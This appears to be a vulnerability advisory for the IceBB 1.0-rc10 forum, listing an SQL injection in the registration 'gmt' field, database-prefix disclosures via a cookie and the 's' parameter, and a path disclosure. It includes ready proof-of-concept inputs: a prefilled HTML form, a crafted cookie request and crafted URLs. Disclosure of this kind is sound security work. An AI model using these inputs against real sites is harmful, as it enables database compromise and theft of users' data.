@@ -1,0 +1,53 @@
+Vulnerability ID: HTB22688
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_icebb.html
+Product: IceBB
+Vendor: XAOS Interactive ( http://icebb.net/ ) 
+Vulnerable Version: 1.0-rc10
+Vendor Notification: 02 November 2010 
+Vulnerability Type: SQL Injection
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+SQL Injection:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "gmt" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+
+<form action="http://[host]/index.php" method="post" >
+<input type="hidden" name="act" value="login" />
+<input type="hidden" name="func" value="Register" />
+<input type="hidden" name="terms" value="1" />
+<input type="hidden" name="user" value="pentest" />
+<input type="hidden" name="pass" value="pentest" />
+<input type="hidden" name="pass2" value="pentest" />
+<input type="hidden" name="email" value="pentest@htbridge.ch" />
+<input type="hidden" name="captcha_code" value="[captcha_code]" />
+<input type="hidden" name="captcha_word" value="[captcha_word]" />
+<input type="hidden" name="gmt" value="'SQL_CODE_HERE" />
+<input type="submit" value="Register" name="submit" />
+</form>
+
+Information Disclosure:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "icebb_login_key" variable from cookie, it's possible to generate an sql query error that will reveal the database tables prefix.
+
+
+GET /index.php HTTP/1.0
+Cookie: icebb_user=1; icebb_pass=2; icebb_uid=3; icebb_login_key=123\;
+
+Information Disclosure:
+The vulnerability exists due to failure in the "/index.php" and "/admin/index.php" scripts to properly sanitize user-supplied input in "s" variable, it's possible to generate an sql query error that will reveal the database tables prefix.
+
+
+http://[host]/index.php?act=login&func=captcha&s=\
+http://[host]/admin/index.php?s=123%27
+
+Path Disclosure:
+The vulnerability exists in the "/modules/make_image.php" script.
+A remote user can determine the full path to the web root directory and other potentially sensitive information.
+
+
+http://[host]/modules/make_image.php
+
